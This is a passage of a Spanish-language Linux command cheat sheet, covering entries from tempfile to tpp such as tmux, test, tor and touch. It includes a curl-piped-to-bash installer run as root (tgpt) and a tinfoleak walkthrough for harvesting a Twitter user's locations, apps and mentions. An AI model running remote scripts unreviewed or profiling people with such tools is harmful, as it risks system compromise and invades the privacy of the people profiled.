	Trying 192.168.0.27...
	Connected to 192.168.0.27...
Si el puerto está abierto pero no hay ningún demonio atendiendo peticiones:
	Trying 192.168.0.27..
	telnet: Unable to connect to remote host: Connection refused
Si el puerto está protegido por un cortafuegos no obtengamos respuesta:
	Trying 192.168.0.10...


tempfile
[debianutils]. Crea un archivo temporal de una manera segura.
$ tempfile
$ tempfile -p 4463 (lo crea con un prefijo especificado. El resultado es parecido a /tmp/4463pAawmz)
$ tempfile -s nota (lo crea con un sufijo especificado. El resualtado es parecido a /tmp/fileKpYlf4nota)


term
[$TERM]. La variable de entorno $TERM no dice qué emulador de terminal se usa [sakura, lxterminal, etc.], sino qué tipo de terminal lógico se está emulando, es decir: le dice al sistema qué capacidades gráficas y de control puede esperar la terminal [¿Soporta colores? ¿Cuántos?, ¿Mueve el cursor con códigos ANSI?, ¿Entiende secuencias para limpiar la pantalla o resaltar texto?]. Los emuladores de terminal [sakura, lxterminal, terminator, guake, etc.] emulan un terminal clásico de hardware, la mayoría compatible con xterm, un estandar de facto que soporta colores extendidos [xterm-256color] y entiende casi todas las secuencias ANSI modernas.
$ infocmp xterm-256color (lista enorme de las capacidades del tipo especificado)
Algunos valores que se puede encontrar en la variable $TERM:
        xterm --> un terminal tipo xterm clásico, 16 colores.
        xterm-256color --> lo mismo, pero con 256 colores.
        linux --> la consola virtual de Linux (Ctrl+Alt+F1..F6). 16 colores.
        vt100, vt220 --> terminales físicos DEC muy populares en los 80. 8/16 colores.
        ansi --> soporte básico de secuencias ANSI. 8/16 colores.
        screen-256color --> cuando se está dentro de screen. 256 colores.
        tmux-256color --> cuando se está dentro de tmux. 256 colores.
        dumb --> terminal mínima sin colores ni control, solo texto plano. 0 colores ni control del cursor).
Para comprobar las diferencias:
$ tput colors (comprobar colores. Ver tput)
$ export TERM_OLD=$TERM (guarda el valor actual)
$ export TERM=dumb (probar con dumb)
$ tput colors (comprobar la diferencia)
$ echo $TERM (comprobar el cambio)
$ export TERM=$TERM_OLD (regresar a la normalidad)
Nota.- Muchos programas no miran la variable $TERM, miran $COLORTERM si está en "truecolor"
$ echo $COLORTERM
$ export COLORTERM=truecolor (si no estuviera en truecolor)
$ tput colors (si marca 256, correcto)
1.-
Configurar tmux para 256 colores
$ nano ~/.tmux.conf
Añadir las lineas
        set -g default-terminal "tmux-256color"
        set -ga terminal-overrides ",xterm-256color:RGB"
2.-
Configurar screen para 256 colores
$ nano ~/.screenrc
$ screen -T screen-256color
Añadir la linea
        term screen-256color
O lanzar
$ screen -T screen-256color


termdebug
Utilidades que ayudan a grabar, reproducir y comparar sesiones interactivas en la terminal. Incluye las aplicaciones: tdcompare, tdrecord, tdreplay, tdrerecord y tdview.
$ tdrecord salida (iniciará la grabación de la sesión de terminal y almacenará los comandos ejecutados y las salidas en "salida")
$ tdreplay salida (reproduce la sesión del archivo grabado)
$ tdrerecord salida nueva_salida (tomar la sesión grabada en "salida" y creará una nueva grabación en nueva_salida)
$ tdcompare salida nueva_salida (muestra las diferencias entre las dos sesiones grabadas)
$ tdview salida (visualizar el contenido de una grabación sin reproducirla en la terminal)


terminal
Nombre de la consola propia de xfce. El archivo de configuración se encuentra en:
$ nano .config/Terminal/terminalrc


terminalize
[nodejs npm build-essential libgconf-2-4]. Grabaciones de terminal y gifs animados. Página del poyecto: <https://github.com/faressoft/terminalizer>
$ terminalizer record nombre_proyecto (empezar la grabación)
$ terminalizer play nombre_proyecto (reproducir)
$ terminalizer render nombre_proyecto (crear el gif)


terminator
Terminal que puede dividirse horizontalmente y verticalmente.
$ terminator -T linux --geometry 1150x250 (Especificando un titulo y medidas)
$ terminator -b --geometry=400X1050 -e nnn (sin decoración, medidas y ejecutar una aplicación
Algunos atajos:
	Ctrl + Mayus + o (División horizontal)
	Ctrl + Mayus + e (División vertical)
	Ctrl + Mayus + w (Cerrar ventana)
	Ctrl + Mayus + cursores (Redimensionar ventana)
	Alt + cursores (Moverse por las ventanas)
	Ctrl + Mayus + t (Abrir nueva pestaña)
	Ctrl + RePag / AvPag (Moverse entre pestañas)
	Ctrl + Mayus + q (Cerrar terminator)


terminews
Aplicación que permite administrar recursos RSS y mostrar sus fuentes de noticias. Divide la pantalla en 3 areas: Lista de sitios, Lista de noticias de cada canal y el resumen que contiene información adicional del evento seleccionado.
Combinaciones de teclas:
              tab            Cambia entre la lista de sitios y la lista de noticias alternativamente
              enter          Recupera el canal de noticias del sitio seleccionado
              Ctrl o         Descarga el contenido del evento seleccionado
              Ctrl Alt o     Abre el evento seleccionado utilizando el navegador predeterminado
              Ctrl n         Entrar nueva URL a la lista de sitios
              Ctrl f         Buscar entre los sitios existentes. Se permiten varios términos y se utilizan de forma conjunta
              Ctrl q         Cierra cualquier ventana
              Ctrl b         Agrega o elimina el evento seleccionado en la lista de marcadores
              Ctrl Alt b     Muestra los eventos marcados
              Del            Elimina el sitio seleccionado
              Flecha arriba  Se desplaza al elemento de lista anterior de forma circular
              Flecha abajo   Se desplaza al siguiente elemento de lista de forma circula
              PgUp           Va a la página de lista anterior de forma circular
              PgDn           Va a la página de lista siguiente de forma circular
              Ctrl h         Abre la ventana de las combinaciones de teclas
              Ctrl c         Cierra la aplicación


terminology
Emulador de terminal para sistemas Linux/BSD/UNIX que usa EFL. Se usa como su emulador de terminal vt100 normal con todas las características habituales, como compatibilidad con 256 colores. Terminology está diseñada para emular Xterm en la mayoría de los aspectos.
$ terminology (arrancar el emulador)
$ tycat imagen.png (muestra la imgen en el emulador)


termit
Emulador de terminal con soporte para múltiples pestañas, codificación de conmutación, sesiones, combinaciones de teclas configurables, lenguaje Lua incorporado y título de ventana dinámica similar a xterm.


termite
Emulador de terminal.
$ termite --geometry=900x150 (Especificando medidas)
$ termite -e htop (Ejecutar una aplicación)


termsaver
Salvapantallas para la terminal.
$ termsaver quotes4all (Irá mostrando citas extraidas de quotes4all.net)
Otras opciones:
	asciiartfarts (Imagenes en ascii)
	clock (Un reloj digital)
	dot (Un punto)
	rfc (Contenido RTC [conjunto de documentos que sirven de referencia para la comunidad de Internet])
	matrix (Código matrix)
$ termsaver programmer --help (Muestra ejemplos de como usar la opción indicada)
$ termsaver randtxt --word linux_es_un_sistema_genial --delay 1 (Mostrará la frase cada segundo en un lugar distinto de la pantalla)
$ termsaver urlfetcher -u lapipaplena.org (Mostrará el código de la página indicada)
$ termsaver programmer -p script.sh (Mostrará el código indicado linea a linea)


termtosvg
Graba todo lo que vamos escribiendo en la terminal y sus salidas, en formato SVG, desde que lanzamos la aplicación hasta que escribamos "exit". La grabación se guarda en /tmp.
      $ termtosvg
      Recording started, enter "exit" command or Control-D to end
      $   (empezamos a escribir comandos y cuando terminemos:)
      $ exit
      Rendering ended, SVG animation is /tmp/termtosvg_6nxfvxdm.svg
La visualizamos, por ejemplo:
$ firefox /tmp/termtosvg_6nxfvxdm.svg


test
Comprobar tipos de archivos y comparar valores, devolviendo 1 si es cierto y o si es falsa.
Sobre ficheros:
	$ test -e archivo; echo $? (Devuelve 0 si archivo exist)
	$ test -f archivo; echo $? (Devuelve 0 si archivo existe y es un archivo regular)
	$ test -d archivo; echo $? (Devuelve 0 si existe y es un directorio)
	$ test -s archivo; echo $? (Devuelve 0 si archivo existe y tiene un tamaño mayor que 0)
	$ test archivo -nt archivo2; echo $? (Devuelve 0 si archivo se ha modificado con posterioridad a archivo2)
	$ test archivo -ot archivo2; echo $? (Devuelve 0 si archivo se ha modificado con anterioridad a archivo2)
Sobre caracteres numéricos:
	$ test $int1 -eq $int2; echo $? (Devuelve 0 si los enteros son iguales)
	$ test $int1 -ne $int2; echo $? (Devuelve 0 si los enteros NO son iguales)
	$ test $int1 -lt $int2; echo $? (Devuelve 0 si int1 es menor que int2)
	$ test $int1 -le $int2; echo $? (Devuelve 0 si int1 es menor o igual que int2)
	$ test $int1 -gt $int2; echo $? (Devuelve 0 si int1 es mayor estricto que int2)
	$ test $int1 -ge $int2; echo $? (Devuelve 0 si int1 es mayor o igual que int2)
Sobre strings:
	$ DIR=home; test $string; echo $? (Devuelve 0 si la cadena no es nula)
	$ test -z $DIR; echo $? (Devuelve 0 si la longitud del string es 0)
	$ test -n $DIR; echo $? (Devuelve 0 si la longitud del string NO es 0)


testdisk
[photorec]. Escaneo y reparación de particiones.
$ testdisk /list (Muestra todas las particiones incluso las no montadas)


texi2html
Pasar archivos infotex a html.
$ texi2html archivo.texi


tfortune
Al igual que fortune, tfortune es una utilidad que imprime un epigrama aleatorio en inglés.
$ tfortuna print


tgpt
Útil para iniciar una conversación interactiva con ChatGPT en la terminal y realizar multiples preguntas sin salir del entorno. Descarga e instalación:
# curl -sSL https://raw.githubusercontent.com/aandrew-me/tgpt/main/install | bash -s /usr/local/bin
$ tgpt (iniciar la conversación)
  > explicame que es un script de bash


thefuck
Muestra a partir de una serie de reglas de coincidencia algun comando que se ha escrito mal en la terminal o del que solo se han escrito unas letras puestas. Una vez puesta la posible coincidencia, con "intro" se acepta, con las fechas muestras otras posibles coincidencias y con C-c se aborta.
$ thefuck hp-s
$ thefuck mkder


themonospot
Aplicación para escanear archivos .avi o .mkv para obtener información sobre sobre el flujo de datos de audio y video. Esta aplicación nos dirá el codec usado, la calidad del audio, resolución, etc…
$ themonospot video.avi


thermald
Demonio que monitorea y controla la temperatura en portátiles y tabletas con las últimas versiones de CPU de Intel. Una vez que la temperatura del sistema alcanza un cierto umbral, el daemon activa varios métodos de enfriamiento.


thunar
Escritorio.
$ thunar -B (Con varios ficheros seleccionados, al pulsar F2 se abre la ventana para renombrarlos)
$ thunar-volman-settings (Abre el gestor de medios extraíbles)
1.-
Modificar el tema de iconos por defecto:
Descomprimir la carpeta de iconos y moverla:
# mv GartoonRedux /usr/share/icons
Editar o crear el archivo:
$ nano .gtkrc-2.0
Y modificar o añadir la linea:
gtk-icon-theme-name = "GartoonRedux"
Al abrir nuevamente thunar, se muestran los cambios.
2.-
Para habilitar el automontado de dispositivos, además de configurarlo en las propiedades, en algunas distros se precisan los paquetes gvfs gvfs-afc
3.-
Para incluir en el menú contextual la opción "Abrir como root", en "editar/Configurar acciones personalizadas", "añadir" [+] y en la pestaña "Basico" colocar en el cuadro de diálogo:
	nombre: Abrir directorio como root
	descripcion: Abrir directorio con privilegios de root
	comando: gksu thunar %f
	icono: opcional
Y en la pestaña "condiciones generales":
	Patrón de archivos: *
	Aparece si la selección contiene:  Macamos la casilla de directorio y la de archivo


thunderbird
Cliente de mensajeria. Algunos atajos:
	f (Ir al siguiente mensaje)
	b (Ir al mensaje anterior)
	n (Ir al siguiente mensaje no leído)
	p (Ir al anterior mensaje no leído)
	m (Marcar mensaje como leído)
	j (Eliminar mensaje como basura)
	F6 (Alternar entre los tres paneles)
	F8 (Expandir/desexpandir el panel del listado de mensajes)
	Ctrl m (Redactar mensaje)
	Ctrl Enter (Enviar mensaje)
	Ctrl + (Aumentar tamaño del texto)
	Ctrl - (Reducir el tamaño del texto)
	Ctrl 0 (Restaurar el tamaño del texto)
	Ctrl o (Abrir mensaje en una nueva ventana)
	Ctrl w (Cerrar ventana)
	Ctrl r (Responder al mensaje al remitente)
	Ctrl q (Salir)


tidy
Validación y corrección de archivos html
$ tidy fichero.html  (Analiza el código del fichero)
$ tidy -m fichero.html  (Corrige,modificándolo, el código del fichero)
$ tidy -m -asxml fichero.html  (Convierte un html a xml)
$ tidy -m -asxhtml fichero.html ( Convierte un html a xhtml )
$ tidy -m -ashtml fichero.xhtml  ( Convierte un xhtml a html)


tiger
Chequear vulnerabilidades del sistema. Informe en /var/log/tiger
# tiger  (Sin parámetros, escanea todo el sistema)
# tiger -H -l /home/user/logs (crear un html con los resultados y guardarlo en el directorio “logs”)


tightvncserver
(En el cliente: xtightvncviewer). Conexión remota.
En el Servidor:
# tightvncserver -depth 16 -geometry 640x480
En el Cliente:
$ xtightvncviewer
Nota.- Sale una caja de texto donde entrar la ip o nombre del host y otra para ingresar la clave.


tilde
Editor de texto. Ctrl-q para salir.
$ tilde file.txt


tilix
Emulador de terminal en mosaico.
$ tilix --quake (usar tilix como una terminal desplegable)
$ tilix -a session-add-right -x sudo apt update (iniciar dividiendo la terminal a la derecha [a] y ejecutar [x] "apt update")
Otras opciones del parámetro "a" son:
     sesión-add-down - Dividir la terminal por debajo
     app-new-window  - Crear nueva ventana de terminal
     app-new-session - Crear nueva sesión


time
Devuelve el tiempo de ejecución de un comando o aplicación.
$ time netstat -anpt
# time nmap -sS www.tuxapuntes.com
$ time echo "scale=5000; 4*a(1)" | bc -l -q (Calcula 5000 decimales de pi para comprobar velocidad del procesador)


timedatectl
Informa o ajusta la hora del sistema en sistemas Linux con Systemd
# timedatectl status (Informa de la hora configurada mostrando el time zone, la hora universal y otros datos)
# timedatectl list-timezones (consultar todas las zonas horarias)
# timedatectl show  (Muestra la configuración actual del reloj del sistema)
# timedatectl set-time "2014-05-26 11:13:54" (Define el dia y la hora de forma manual)
# timedatectl set-timezone Europe/Madrid (establecer dia y hora de España)


timelimit
Especifica una duración para un proceso o comando.
$ timelimit -t10 tail -f /var/log/apache2/access.log (mostrará el archivo durante 10 segundos)


timeout
Limita el tiempo de funcionamiento de un comando o aplicación.
$ timeout 60m firefox (arrancará firefox y se cerrará a los 60 minutos ["s" para segundos, "h" para horas y "d" para dias])
$ timeout 0.5m top (arrancará el comando top durante 30 segundos)
$ timeout -s SIGINT 6s ping google.com (enviar señal SIGINT en lugar de SIGTERM al alcanzar 6 segundos)


times
Muestra los tiempos de usuario y sistema acumulados para procesos ejecutados desde el interprete de comandos


timg
Visor de imagenes en la terminal.
$ timg imagen.png
$ timg -C --title imagen imagen.png (centrada en la terminal y con título)
$ timg -b white imagen.png (con fondo blanco)
$ timg --grid=3x2 *.jpg (muestra todas las imágenes de esa extensión de la carpeta actual en una rejilla de 3×2)


timidity
Convertir formatos de audio de midi a wav  o a ogg
$ timidity -Ow -s 44100 -o output.wav input.mid  (MIDI -> WAV)
$ timidity -Og -s 44100 -o output.ogg input.mid  ( MIDI -> OGG)


tinfoleak
[tweepy]Mostrar información de twitter sobre un nick concreto. Descarga: <http://vicenteaguileradiaz.com/tools/>
registro en twitter:
Una vez descargada requiera registrar la aplicación en twitter y obtener una Consumer Key y Consumer secret, así como un Token Key y Token Secret, que deberemos rellenar dentro del script .py. Para ello nos loggeamos en nuestra cuenta de twitter y vamos a <https://apps.twitter.com/app/new> y le damos un nombre personal, descripción y un sitio web tipo http://www.algo.com). Una vez creado aparecerá una pestaña llamada API Keys, en la que podremos obtener los valores API Key y API Secret (que son el Consumer Key y Consumer Secret, respectivamente, a rellenar en el script). Luego generar un Token Key y Token secret. Pulsar en el botón "Generate Access Token" y generará un par de valores Access Token y Access Token Secret. Con estos datos rellenamos las variables  CONSUMER_KEY = ‘ ‘, CONSUMER_SECRET = ‘’, ACCESS_TOKEN = ‘ ‘ y ACCESS_TOKEN_SECRET = ‘ ‘ del script.
$ python tinfoleak.py (Ayuda y muestra parámetros)
$ python tinfoleak.py -n usuario -b (Información del usuario)
$ python tinfoleak.py -n usuario -stc 500 (Mostrar aplicaciones usadas por el usuario analizando los últimos 500 twits)
$ python tilfoleak.py -n usuario -gtc 1000 (Mostrar lugar y coordenadas del usuario, incluyendo fecha y hora analizando los últimos 1000 twits)
$ python tinfoleak.py -n usuario -h (Mostrar hashtags usado por el usuario analizando los últimos 100 twits)
$ python tinfoleak.py -n usuario -m (Mostrar menciones de otros usuario analizando los últimos 100 twits)
$ python tinfoleak.py -n usuario -f palabra (Mostrar publicaiones del usuario que inclyen la palabra especificada de los últimos 1000 twits)
$ python tinfoleak.py -n usuario -bsgthmc 1000 --sdate 2014/10/01 --stime 08:00:00 -etime 22:00:00 (Mostrar información básica del usuario, apps, hashtags usados, menciones, coordenadas, fehca y hora de cada twit, analizando los últimos 1000 twits desde la fehca especificada y en la franja horaria de 8 a 22 horas)


tinycdb
Es parte de una biblioteca que permite trabajar con bases de datos de solo lectura llamadas CDB [Constant DataBase - datos constantes]. Una vez que se crea una base de datos CDB, no se puede modificar.
$ cdb -d ejemplo.cdb > extraidos.dat (extrae los datos almacenados en "ejemplo.cdb" y los guarda en el nuevo archivo "extraidos.dat")
$ cdb -q ejemplo.cdb "clave" > valor (busca la clave "clave" en el archivo "ejemplo.cdb" y guarda su valor en el archivo "valor")
$ cdbdump base.cdb (mostrará el contenido de la base de datos)
1.-
Un ejemplo sobre base de datos CDB
Con un archivo de texto llamado data.txt con el siguiente contenido:
clave1 valor1
clave2 valor2
clave3 valor3
$ cdbmake base.cdb < data.txt (se crea la base de datos)
$ cdb -r base.cdb clave1 (busca un valor asociado a una clave específica)


tinyproxy
Crear un proxy HTTP. editar el archivo de configuración:
# nano /etc/tinyproxy/tinyproxy.conf
descomentar las lineas:
	Allow 127.0.0.1 (Si solo queremos conexión en nuestra máquina)
	Port 5023 (modificar el puerto). Por defecto 8888)
	DisableViaHeader Yes (Desactivar la cabecera)
# etc/init.d/tinyproxy restart (Reiniciar el servicio)
Los errores se almacenan en /var/log/tinyproxy/tinyproxy.log
Cuando se quiera usar con el navegador entrar los datos del proxy en Opciones -- Avanzado -- Red


tiptop
Herramienta que proporciona una vista dinámica en tiempo real de las tareas que se ejecutan en el sistema. A menos que tiptop sea ejecutado por root, el usuario solo puede monitorear las tareas que posee.
$ tiptop (arrancar el monitoreo. "q" para cerrar)
# tiptop -u USER (las de un usuario)


tldr
Muestra información de un comando como las páginas man pero más simplificada,como si fueran versiones resumidas de man com más ejemplos.
$ tldr -u (actualizar base de datos. Lanzarlo periodicamente)
$ tldr ip
$ tldr --color tar
$ tldr -L es tldr (mostrará información en español si está disponible)


tleds
Monitoreo del tráfico de red con los leds del teclado. Si el teclado posee los 3 leds de arriba del teclado numérico puede simularse las luces del router con esta aplicación.
# tleds -d 10 wlan0 (con actualización cada 10 milisegundos)
# tleds -q -c -d 25 eth0


tload
Muestra el promedio de carga en el terminal en forma de dibujos de caracteres.
$ tload -d 2 (Con actualizacion cada 2 segundos)


tlp
herramienta avanzada de administración de energía para Linux. Viene con un configuración predeterminada ya optimizada para la duración de la batería. Al mismo el tiempo es altamente personalizable. Puede habilitar o deshabilitar los dispositivos de radio bluetooth, WiFi y WWAN al iniciar el sistema.
# tlp start (iuniciar la herramienta)
# tlp-stat -b (información de la bateria)
# tlp-stat -s (consultar estado)
# tlp-stat -c (mostrar configuración)
Otras opciones:
	-u (Información de los dispositivos)
	-g (de los gráficos)
	-r (de la radio)
	-t (temperaturas)
	-w (errores)


tml
Programa que facilita la salida de texto con color y formato en la terminal.
$ echo "<bold><yellow># Título grande en amarillo negrita</yellow></bold>" | tml (título con colores y estilos. Probar diferencia sin el pipe)
$ echo "Normal, <italic>cursiva</italic>, <underline>subrayado</underline>, <dim>atenuado</dim>." | tml
$ echo "<bold><red_bg><white>ERROR con fondo rojo y texto blanco</white></red_bg></bold>" | tml
$ echo "Esto es <red>rojo</red>, <green>verde</green> y <blue>azul</blue>." | tml (texto coloreado)
$ echo "<bold><green>ERROR con texto </green><underline><red>rojo</red></underline></bold>" | tml


tmpfs
Permite asignar parte de la memoria física para ser utilizada como una partición lo que permite una vez montada, leer o escribir archivos de la RAM como si de una partición de disco se tratara. Dado que se está escribiendo en la memoria RAM del sistema, esta se borra en un reinicio o en un cuelgue. Relacionado con ramfs [ver], se diferencia de este en que tmpfs usa swap y que no permite escribir más que el tamaño que se ha especificado en el montaje. El proceso:
# mkdir /media/tmp
# mount -t tmpfs -o size=20m tmpfs /media/tmp
Comprobar con df -k [ver] o mount [ver] su correcto montaje


tmux
Terminal multiplexor
$ tmux (lanzar la aplicación)
$ tmux ls (listar las sesiones tmux abiertas)
$ tmux attach -t 0 (sincronizarse con la sesión 0 [attach] en local o en remoto via ssh)
$ tmux rename-session -t 0 tty1 (renombrar la sesion 0 a tty1)
$ tmux kill-window -t 2 (matar una ventana con el número 2)
$ tmux kill-session -t 2 (matar una sesión con el número 2)
$ tmux new-session -s hack_wifi (abrir sesión con un nombre)
$ tmux new-session -d 'htop' (lanzar un comando en una nueva sesión sin unirse a ella)
$ tmux list-commands (listar la sintaxis de todos los comandos soportados)
$ tmux list-keys (listado de todas las teclas de control)
$ tmux new-session -d 'vi /etc/apt/sources.list' \; split-window -d 'newsbeuter' \; attach (arrancar una sesión tmux con el sources.list en el panel superior y con el lector RSS newsbeuter en el inferior)
$ tmux new-session \; split-window \; split-window -h \; split-window -v \; attach (Arrancar la aplicación con varios panels horizontales y verticales)
Atajos:
	Ctrl+b c (Crear una nueva ventana)
	Ctrl+b d (Salir de tmux actual (detach) sin cerrar sesión)
	Ctrl+b n (Ir a la ventana siguiente)
	Ctrl+b p (Ir a la ventana anterior)
	Ctrl+b & (Matar la ventana actual, incluye todos los paneles)
	Ctrl+b x (Matar panel actual)
	Ctrl+b , (cambiar el nombre de la ventana actual )
	Ctrl+b % (Dividir verticalmente la ventana actual en dos paneles)
	Ctrl+b " (Dividir horizontalmente la ventana actual en dos paneles)
	Ctrl+b q (Mostrar brevemente los números de cada panel)
	Ctrl+b o (Cambiar al siguiente panel)
	Ctrl+b ? (Lista todas las combinaciones de teclas de control)
	Ctrl+b w (Lista todas las ventanas)
	Ctrl+b núm (Moverse a la ventana seleccionada (0-9). No al panel)
	Ctrl+b up (Ir al panel de encima)
	Ctrl+b down (Ir al panel de abajo)
	Ctrl+b left (Ir al panel de la izquierda)
	Ctrl+b right (Ir al panel de la derecha)
	Ctrl+b t (Muestra en el panel un reloj digital)
	Ctrl+b s (Elegir sesión)
	Ctrl+b [ (Entra en modo scroll con la teclas del cursor. Termina pulsando q)
1.-
Muestra para colorear los paneles:
Crear en el directorio personal el archivo oculto:
$ touch .tmux.conf
Con el siguiente contenido [modificar al gusto]
	# default statusbar colors
	set -g status-fg colour136
	set -g status-bg colour235
	set -g status-attr default
	# default window title colors
	setw -g window-status-fg colour244
	setw -g window-status-bg default
	setw -g window-status-attr dim
	# active window title colors
	setw -g window-status-current-fg colour166
	setw -g window-status-current-bg default
	#setw -g window-status-current-attr bright
	setw -g window-status-current-attr underscore
	# panel border
	set-option -g pane-border-fg white #base02
	set-option -g pane-active-border-fg colour46 #base01
	# command/message line colors
	set -g message-fg white
	set -g message-bg black
	set -g message-attr bright
	# pane number display
	set-option -g display-panes-active-colour colour33 #blue
	set-option -g display-panes-colour colour166 #orange
	# clock
	set-window-option -g clock-mode-colour colour64 #green


tmuxinator
gema de ruby que permite definir pestañas, páneles y comandos que correrán en cada uno de los paneles de una sesión tmux. Cada proyecto guarda su configuración en un archivo .yml en el directorio ~/.tmuxinator. En el archivo .bashrc ha de constar la variable $EDITOR [export EDITOR=/usr/bin/vim, nano o el que sea]
	$ tmuxinator new proyecto1 (Crear un proyecto)
	$ tmuxinator proyecto1 (Abrir un proyecto)
	$ tmuxinator open proyecto1 (Editar un proyecto)
	$ tmuxinator list (Listar todos los proyectos)
	$ tmuxinator delete proyecto1 (Suprimir un proyecto)
	$ tmuxinator doctor (Ver problemas en la configuración)
	$ tmuxinator implode (Suprimir todos los proyectos)
Muestra de un archivo.yml:
	name: proyecto1
	root: ~/
		windows:
			- editor:
			layout: main-vertical
			panes:
				- top
				- who; pwd


toe
Enumera todos los tipos de terminal disponibles por nombre principal con descripciones. Más de 1800.
$ toe -a -s (informe sobre todas las bases de datos de terminal y una columna con entradas pertenecientes a una base de datos de terminal determinada.)


toilet
(figlet mejorado). Edición de banners
$ toilet -f future -F gay texto
$ toilet -t -f smblock -F metal -E html texto
Opciones
-f bigmono12 (Otras fuentes: bigmono9, circle, emboss, emboss2, future, mono12, mono9, smblock, smbraille, smmono12, smmono9)
-F gay (filtro "gay" o "metal")
-E html (Saca en formato en html para su inclusión en una web)
-t (se adapta al ancho de la terminal)
-S (letras más juntas. Por defecto es -s)
-o (más juntas)


tomb
Encriptar directorios. Por seguridad ha de desactivarse la partición swap (intercambio) antes de crear la tumba o al acceder a ella a menos que tengamos la swap encriptada.
# swapoff -a (“swapon” para activarla nuevamente)
En algunas distros es necesario activar el demonio:
# /etc/init.d/cryptdisks start
# tomb create -s 1024 --ignore-swap cripta (Crear el directorio encriptado .tomb y el de la clave .key, especificando medida. Pedirá contraseña y confirmación. )
# tomb-open cripta.tomb (Abrir el directorio encriptado cuando .tomb y .key estan en el mismo directorio. Lo montará en /media/tumba.tomb)
# tomb -k /root/cripta.tomb.key open cripta.tomb (Montar el directorio encriptado cuando .key está en otro directorio [/root]
# tomb close cripta (Cerrar el directorio. En realidad desmontarlo)


toot
Cliente de la red social de microblogging Mastodon libre y descentralizada similar a Twitter.
$ toot --help (muestra todos los comando que pueden utilizarse)
$ toot bookmark --help (información de un comando concreto)
$ toot login (pulsar intro a las preguntas y cuando abra el navegador autorizamos, copiamos el codigo y lo pegamos en la terminal)
$ toot tui (comenzar uso de la red social)
$ toot auth (mostrar cuentas e instancias conectadas)
$ toot post "Texto que se envia"
$ toot post -m $HOME/Images/gnu.png "Texto adjunto a la imagen"
$ toot search otro-usuario (buscar un usuario)
$ toot timeline (muestra las publicaciones més recientes)
$ toot delete (borrar estado)
$ toot notifications (ver notificaciones del usuario logueado)
$ toot whois @usuario (información del perfil de @usuario)
$ toot logout (cerrar sesión y eliminar claves de acceso almacenadas)


top
información sobre el estado del sistema, procesos, uso del procesador, memoria etc... en ejecucion
$ top | grep Tasks (Visualizar procesos abiertos incluidos los zombies)
$ top -u usuario  (procesos abiertos por el usuario indicado)
$ top -p $(pgrep -d, yaourt) (Monitorizar un proceso)
$ top -p `pgrep pidgin` (Monitorear un proceso)
$ top -b -n 2 -d 2 (En modo batch [b] que termine el comando despues de mostrar 2 procesos top [n] con un intervalo de 2 segundos [d])
Teclas de control
Ctrl + m (los ordenamos por uso de memoria)
Ctrl + c  (Salir)
k  (y colocar el PID correspondiente mataremos el proceso)
Z  (para modificar el color. Con “z” se escoge el color)
n  ( y colocar el número de procesos que queremos visualizar)
A  (abre multiples ventanas “top”)
f   (activa/desactiva columnas a visualizar)
o  (Modifica el orden de las columnas)
G + num (del 1 al 4 cambia el modo de presentación)
W (Graba el tipo de visualización. A partir de la siguiente vez que se lance la aplicación se mostrará con los parámetros grabados)
Columnas:
PID .-		 Identificador
USER.-	 Usuario que ha ejecutado el proceso.
PR.-		 Prioridad
NI.-		 Valor nice del proceso (negativos-> mayor prioridad)
RES.-		 Memoria RAM ocupada por el proceso.
%CPU.-	 Porcentaje ocupado de la CPU
TIME+.-	 Cuanto tiempo lleva el proceso en el sistema.
COMMAND.- Nombre del procesos y sus parametros.
PPID.-		 PID del proceso padre.
UID.-		 ID del usuario que ha ejecutado el proceso.


toplip
Herramienta para encriptar archivos.
$ toplip archivo.txt (encriptar pero solo viendolo por teminal)
$ toplip archivo.txt > archivo.txt.cryp (encriptar y mardarlo a un archivo)
$ toplip -d archivo.txt.cryp > archivo.txt (desencriptar)
$ toplip -alt archivo1.txt archivo2.txt > archivo_global.crip (Encriptar dos archivos en uno pero con dos contraseñas para cada archivo encriptado)
$ toplip -d archivo_global.crip > archivo1.txt (desencriptar si entramos la contraseña del primer archivo encriptado)
$ toplip -c 2 archivo.txt > archivo.txt.crip (encriptar un archivo con dos contraseñas)
$ toplip -c 2 -d archivo.txt.crip > archivo.txt (desencriptar un archivo con dos contraseñas)
$ toplip -m imagen.jpg archivo.txt > imagen_crip.jpg
$ toplip -d imagen_crip.png > archivo.txt


tor
[The Onion Router]. Sistema de comunicación anónima de baja latencia que consiste en que la ruta pasa desde el origen a través de un conjunto de repetidores y negocian un "circuito virtual" a través de la red, donde cada repetidor conoce a su predecesor y sucesor, pero no a los demás. Básicamente, Tor proporciona una red distribuida de repetidores. Los usuarios rebotan sus flujos TCP [tráfico web, FTP, SSH, etc.] entre los repetidores, y los destinatarios, observadores e incluso los propios repetidores tienen dificultades para saber qué usuarios se conectaron a qué destinos. Por sí solo, tor no sirve como navegador ni envía tráfico HTTP directamente. Funciona como un servicio que escucha en un puerto, normalmente el 9050 o 9150, y espera que otro programa como curl, wget, o un navegador lo use como proxy.
$ curl --socks5 127.0.0.1:9050 https://api.ipify.org (devolverá una IP de un nodo de salida Tor, no la IP real)
$ curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/ > prueba.html (correcto si al abrir en el navegador prueba.html dice "Congratulations. This browser is configured to use Tor")
$ tor --verify-config (verificar la configuración. Si "Configuration was valid" todo correcto)
$ tor --list-fingerprint (muestra la huella del nodo, si se corre un relé o un puente)


tor-resolve
Resuelve direcciones IP o nombres de host via tor.
$ tor-resolve lapipaplena.net


torify
Verificar si la navegación está torificada.
$ torify elinks checkip.dyndns.org


torsocks
Con tor funcionando, permite lanzar aplicaciones a través de la red para enmascarar la ip. Ver proxychains.
# torsocks ssh usuario@host
# torsocks w3m ifconfig.me


totem
Reproductor de video
$ totem-video-thumbnailer -pg 30 video.mpeg salida (Creación de una imagen formada por thumbnailes de un video)


touch
Crea un fichero vacio
$ touch notas.txt
# touch /forcefsck (crear un fichero vacío para forzar el chequeo del disco)
$ touch -d "18-6-2011 17:09:24" archivo (modificar la fecha de creación)
$ touch -m archivo (Lo mismo a la fecha actual)
$ touch file{1..9} (crear los archivo del file1 al file9
$ touch file{1..9}{a..z} (Crear los archivos del filea1 al filez9)
$ touch a b c d (Crear varios archivos)
$ touch -c archivo (Si “archivo” existe no lo creará)
$ touch -a archivo (modifica el último acceso al archivo. Comprobar con $ stat archivo)


tpp
Presentaciones en terminal.
--title Este_es_el_titulo   (titulo de la presentación)
--author juanito            (Autor)
--date today  %d %b %Y      (fecha actual en formato dia/mes/año)
--bgcolor yellow           (color de fondo)
--fgcolor black            (color texto. Los colores válidos son: white, yellow, red, green, blue, cyan, magenta, black. Por defecto transparencia))
--heading inicio           (nombre de la página, centrado)
